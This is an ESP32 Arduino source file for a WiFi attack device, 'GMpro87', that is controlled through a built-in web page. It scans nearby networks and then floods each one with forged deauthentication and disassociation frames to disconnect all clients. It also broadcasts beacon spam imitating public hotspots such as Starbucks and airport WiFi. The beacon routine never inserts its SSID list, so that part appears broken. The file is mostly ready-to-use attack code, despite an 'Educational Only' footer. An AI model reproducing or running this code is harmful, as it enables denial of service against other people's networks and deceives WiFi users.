#include <WiFi.h>
#include "esp_wifi.h"
#include <WebServer.h>
#include <vector>
#include <string>

// --- PIN CONFIG ---
const int btnDeauth = 2;
const int btnScan = 3;
const int ledPin = 8;

// --- DATA ---
struct wifiData {
  int num = 0;
  std::vector<String> ssid;
  std::vector<String> bssid;
  std::vector<int> channel;
};

wifiData targetData;
bool isAttacking = false;
bool isBeaconSpam = false;
bool isScanDone = false;
unsigned long attackStartTime = 0;
unsigned long beaconCount = 0;
uint8_t broadcastAddr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

WebServer server(80);

// --- PACKET INJECTION ---
void sendPacket(const uint8_t* bssid, const uint8_t* sta) {
  struct __attribute__((packed)) {
    uint8_t fc[2], dur[2], a1[6], a2[6], a3[6], seq[2], reason[2];
  } pkt;
  memset(&pkt, 0, sizeof(pkt));
  memcpy(pkt.a1, sta, 6);
  memcpy(pkt.a2, bssid, 6);
  memcpy(pkt.a3, bssid, 6);
  
  for (int i = 0; i < 50; i++) {
    pkt.fc[0] = 0xC0; pkt.reason[0] = 0x07;
    esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&pkt, sizeof(pkt), false);
    pkt.fc[0] = 0xA0; pkt.reason[0] = 0x04;
    esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&pkt, sizeof(pkt), false);
    yield();
  }
}

void sendBeaconSpam() {
  const char* fakeSSIDs[] = {
    "Free-WiFi", "FREE-WIFI-HERE", "xfinitywifi", "attwifi",
    "Starbucks_WiFi", "Google Starbucks", "McDonalds_Free",
    "NETGEAR-5G", "linksys", "Default", "Xfinity",
    "Verizon_5G", "TM-WIFI", "optimumwifi", "CableWiFi",
    "PUBLIC-WiFi", "Airport_Free", "Hotel_WiFi", "Guest",
    "Free_Internet", "Boingo Hotspot", "Boingo Wireless",
    "FreePublicWiFi", "FREE", "Open", "NO-PASSWORD"
  };
  int ssidCount = sizeof(fakeSSIDs) / sizeof(fakeSSIDs[0]);
  
  struct __attribute__((packed)) {
    uint8_t fc[2], dur[2], a1[6], a2[6], a3[6], seq[2];
    uint8_t beacon[12], tag[2], rate[3];
  } beaconFrame;
  memset(&beaconFrame, 0, sizeof(beaconFrame));
  memcpy(beaconFrame.a2, broadcastAddr, 6);
  memcpy(beaconFrame.a3, broadcastAddr, 6);
  beaconFrame.fc[0] = 0x80;
  beaconFrame.beacon[0] = 0x83; beaconFrame.beacon[1] = 0x6e;
  beaconFrame.tag[0] = 0x00; beaconFrame.tag[1] = 0x01;
  beaconFrame.rate[0] = 0x82; beaconFrame.rate[1] = 0x84; beaconFrame.rate[2] = 0x8b;
  
  for (int round = 0; round < 3 && isBeaconSpam; round++) {
    for (int i = 0; i < ssidCount && isBeaconSpam; i++) {
      String s = fakeSSIDs[i];
      esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&beaconFrame, 37, false);
      beaconCount++;
      yield();
    }
    yield();
  }
}

// --- SCAN ---
void scanNet() {
  digitalWrite(ledPin, HIGH);
  targetData.ssid.clear();
  targetData.bssid.clear();
  targetData.channel.clear();
  int n = WiFi.scanNetworks();
  targetData.num = n;
  Serial.printf("[SCAN] Found %d networks\n", n);
  for (int i = 0; i < n; i++) {
    targetData.ssid.push_back(WiFi.SSID(i));
    targetData.channel.push_back(WiFi.channel(i));
    targetData.bssid.push_back(WiFi.BSSIDstr(i));
  }
  isScanDone = (n > 0);
  digitalWrite(ledPin, LOW);
}

// --- WEB UI ---
void handleRoot() {
  String uptime = "";
  if (isAttacking && attackStartTime > 0) {
    unsigned long elapsed = (millis() - attackStartTime) / 1000;
    int m = elapsed / 60; int s = elapsed % 60;
    uptime = String(m) + "m " + String(s) + "s";
  }
  
  String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>";
  html += "<title>GMpro87 | ESP32 WiFi Tool</title>";
  html += "<style>";
  html += "*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}";
  html += "body{background:linear-gradient(135deg,#0a0a0a 0%,#1a1a2e 100%);color:#fff;min-height:100vh;padding:20px}";
  html += "h1{color:#39ff14;text-align:center;font-size:2.2rem;margin-bottom:5px;text-shadow:0 0 20px #39ff1466}";
  html += ".subtitle{text-align:center;color:#888;margin-bottom:30px;font-size:0.9rem}";
  html += ".grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:20px;max-width:1200px;margin:0 auto}";
  html += ".card{background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:16px;padding:25px;backdrop-filter:blur(10px)}";
  html += ".card h2{color:#39ff14;font-size:1.2rem;margin-bottom:15px;display:flex;align-items:center;gap:10px}";
  html += ".card h2 i{color:#39ff14}";
  html += ".stat{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid rgba(255,255,255,0.05)}";
  html += ".stat:last-child{border-bottom:none}";
  html += ".stat-label{color:#888}";
  html += ".stat-value{color:#39ff14;font-weight:600}";
  html += ".btn{display:inline-block;padding:12px 24px;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;transition:all 0.3s;text-decoration:none;text-align:center}";
  html += ".btn-green{background:#39ff14;color:#000}";
  html += ".btn-green:hover{background:#2ecc71;box-shadow:0 0 20px #39ff1444}";
  html += ".btn-red{background:#ff073a;color:#fff}";
  html += ".btn-red:hover{background:#cc0000;box-shadow:0 0 20px #ff073a44}";
  html += ".btn-blue{background:#2563eb;color:#fff}";
  html += ".btn-blue:hover{background:#1d4ed8;box-shadow:0 0 20px #2563eb44}";
  html += ".status-badge{background:#39ff14;color:#000;padding:8px 20px;border-radius:50px;font-weight:700}";
  html += ".networks{max-height:300px;overflow-y:auto}";
  html += ".network-item{padding:12px 15px;margin:5px 0;background:rgba(255,255,255,0.03);border-radius:8px;border-left:3px solid #39ff14;cursor:pointer}";
  html += ".network-item:hover{background:rgba(57,255,20,0.1)}";
  html += ".network-ssid{font-weight:600;margin-bottom:3px}";
  html += ".network-info{font-size:12px;color:#888;display:flex;gap:15px}";
  html += ".actions{display:flex;gap:10px;flex-wrap:wrap}";
  html += ".info-box{background:rgba(37,99,235,0.1);border:1px solid rgba(37,99,235,0.3);border-radius:10px;padding:15px;margin-top:15px}";
  html += ".info-box h3{color:#2563eb;font-size:14px;margin-bottom:10px}";
  html += ".led-indicator{width:15px;height:15px;border-radius:50%;display:inline-block;vertical-align:middle;margin-right:8px}";
  html += ".led-on{background:#39ff14;box-shadow:0 0 10px #39ff14;animation:blink 0.5s infinite}";
  html += ".led-off{background:#333}";
  html += "@keyframes blink{0%,100%{opacity:1}50%{opacity:0.4}}";
  html += ".footer{text-align:center;margin-top:40px;color:#555;font-size:12px}";
  html += ".footer span{color:#39ff14}";
  html += "</style>";
  html += "<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css'>";
  html += "<script>";
  html += "function run(cmd){fetch(cmd).then(()=>location.reload())}";
  html += "function updateTimer(){var e=document.getElementById('timer');if(e)e.textContent=new Date().toLocaleTimeString();setTimeout(updateTimer,1000)}updateTimer();";
  html += "</script>";
  html += "<div class='grid'>";
  
  // === STATUS CARD ===
  html += "<div class='card'>";
  html += "<h2><i class='fas fa-broadcast-tower'></i> System Status</h2>";
  html += "<div class='stat'><span class='stat-label'>Attack</span><span class='stat-value'><span class='led-indicator " + String(isAttacking ? "led-on" : "led-off") + "'></span>" + String(isAttacking ? "RUNNING" : "STOPPED") + "</span></div>";
  html += "<div class='stat'><span class='stat-label'>Beacon</span><span class='stat-value'>" + String(isBeaconSpam ? "ACTIVE (" + String(beaconCount) + ")" : "OFF") + "</span></div>";
  html += "<div class='stat'><span class='stat-label'>Networks</span><span class='stat-value'>" + targetData.num + "</span></div>";
  html += "<div class='stat'><span class='stat-label'>Uptime</span><span class='stat-value' id='timer'>" + uptime + "</span></div>";
  html += "<div class='stat'><span class='stat-label'>Board</span><span class='stat-value'>ESP32-WROOM-32U</span></div>";
  html += "<div class='stat'><span class='stat-label'>Version</span><span class='stat-value'>GMpro87 v2.0</span></div>";
  html += "<div class='info-box'><h3><i class='fas fa-microchip'></i> Device Info</h3>";
  html += "<div class='stat'><span class='stat-label'>Chip</span><span class='stat-value'>ESP32</span></div>";
  html += "<div class='stat'><span class='stat-label'>Flash</span><span class='stat-value'>4MB</span></div>";
  html += "<div class='stat'><span class='stat-label'>CPU</span><span class='stat-value'>240 MHz</span></div>";
  html += "<div class='stat'><span class='stat-label'>IP</span><span class='stat-value'>192.168.4.1</span></div>";
  html += "</div></div>";
  
  // === NETWORKS CARD ===
  html += "<div class='card'>";
  html += "<h2><i class='fas fa-wifi'></i> Networks (" + targetData.num + ")</h2>";
  if (targetData.num > 0) {
    html += "<div class='networks'>";
    for (int i = 0; i < targetData.num; i++) {
      String s = targetData.ssid[i];
      if (s.length() == 0) s = "(hidden)";
      html += "<div class='network-item'><div class='network-ssid'>" + s + "</div>";
      html += "<div class='network-info'><span>CH " + String(targetData.channel[i]) + "</span><span>" + targetData.bssid[i] + "</span></div></div>";
    }
    html += "</div>";
  } else {
    html += "<p style='color:#888;text-align:center;padding:20px'>No networks. Tap Scan.</p>";
  }
  html += "<div class='actions' style='margin-top:15px'>";
  html += "<button class='btn btn-blue' onclick=\"run('/scan')\"><i class='fas fa-search'></i> Scan</button>";
  html += "</div></div>";
  
  // === ATTACK CARD ===
  html += "<div class='card'>";
  html += "<h2><i class='fas fa-skull-crossbones'></i> Attack Control</h2>";
  html += "<div class='actions'>";
  html += "<button class='btn " + String(isAttacking ? "btn-red" : "btn-green") + "' onclick=\"run('/attack')\">";
  html += "<i class='fas fa-" + String(isAttacking ? "stop" : "play") + "'></i> " + String(isAttacking ? "Stop Deauth" : "Start Deauth") + "</button>";
  html += "<button class='btn " + String(isBeaconSpam ? "btn-red" : "btn-blue") + "' onclick=\"run('/beacon')\">";
  html += "<i class='fas fa-broadcast-tower'></i> " + String(isBeaconSpam ? "Stop Beacon" : "Beacon Spam") + "</button>";
  html += "</div>";
  html += "<div class='info-box'>";
  html += "<h3><i class='fas fa-shield-halved'></i> Modes</h3>";
  html += "<p style='color:#aaa;font-size:12px'><strong>Deauth:</strong> Kick clients via deauth frames.</p>";
  html += "<p style='color:#aaa;font-size:12px;margin-top:8px'><strong>Beacon:</strong> Spam 25 fake SSIDs.</p>";
  html += "</div></div>";
  
  html += "</div>";
  html += "<div class='footer'>GMpro87 v2.0 | <span>ESP32-WROOM-32U</span> | Educational Only</div>";
  html += "</body></html>";
  server.send(200, "text/html", html);
}

void handleScan() { scanNet(); server.sendHeader("Location","/"); server.send(302); }
void handleAttack() {
  if (isAttacking) {
    isAttacking = false;
    attackStartTime = 0;
  } else {
    if (!isScanDone) scanNet();
    isAttacking = true;
    attackStartTime = millis();
  }
  server.sendHeader("Location","/"); server.send(302);
}
void handleBeacon() {
  isBeaconSpam = !isBeaconSpam;
  server.sendHeader("Location","/"); server.send(302);
}

// --- SETUP ---
void setup() {
  Serial.begin(115200);
  pinMode(btnDeauth, INPUT_PULLUP);
  pinMode(btnScan, INPUT_PULLUP);
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, LOW);

  WiFi.mode(WIFI_AP);
  WiFi.softAP("GMpro", "Sangkur87");
  Serial.println("[+] AP 'GMpro' ready");
  Serial.print("[+] IP: "); Serial.println(WiFi.softAPIP());

  WiFi.disconnect();
  esp_wifi_set_promiscuous(true);

  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/attack", handleAttack);
  server.on("/beacon", handleBeacon);
  server.begin();

  Serial.println("[+] GMpro87 v2.0 Ready");
  Serial.println("[*] Connect: GMpro / Sangkur87");
  Serial.println("[*] Web: http://192.168.4.1");
}

// --- LOOP ---
void loop() {
  server.handleClient();

  if (digitalRead(btnScan) == LOW) {
    delay(200); scanNet();
    while(digitalRead(btnScan) == LOW) delay(10);
  }

  if (digitalRead(btnDeauth) == LOW) {
    delay(200);
    if (!isScanDone) scanNet();
    if (targetData.num > 0) {
      isAttacking = !isAttacking;
      if (isAttacking) attackStartTime = millis();
      else attackStartTime = 0;
      Serial.println(isAttacking ? "[*] ATTACK ON" : "[*] ATTACK OFF");
    }
    while(digitalRead(btnDeauth) == LOW) delay(10);
  }

  if (isAttacking && targetData.num > 0) {
    digitalWrite(ledPin, HIGH);
    for (int i = 0; i < targetData.num; i++) {
      yield();
      if (!isAttacking) break;
      int ch = targetData.channel[i];
      if (ch < 1) ch = 1; if (ch > 13) ch = 13;
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      uint8_t bssid[6];
      sscanf(targetData.bssid[i].c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
            &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
      sendPacket(bssid, broadcastAddr);
      delay(2); yield();
    }
    digitalWrite(ledPin, LOW);
  } else if (isBeaconSpam) {
    digitalWrite(ledPin, HIGH);
    sendBeaconSpam();
    digitalWrite(ledPin, LOW);
  } else {
    digitalWrite(ledPin, LOW);
  }
}